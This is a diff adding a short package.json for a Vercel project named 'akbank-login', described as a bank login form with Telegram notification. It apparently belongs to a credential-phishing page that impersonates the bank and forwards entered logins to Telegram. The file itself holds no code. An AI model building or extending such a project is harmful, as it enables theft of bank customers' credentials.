@@ -1,0 +1,21 @@
+{
+  "name": "akbank-login",
+  "version": "1.0.0",
+  "description": "Akbank Login Form with Telegram Notification",
+  "main": "index.html",
+  "scripts": {
+    "dev": "vercel dev",
+    "build": "echo 'No build step required'"
+  },
+  "keywords": [
+    "vercel",
+    "serverless",
+    "telegram"
+  ],
+  "author": "",
+  "license": "MIT",
+  "engines": {
+    "node": ">=18.x"
+  }
+}
+
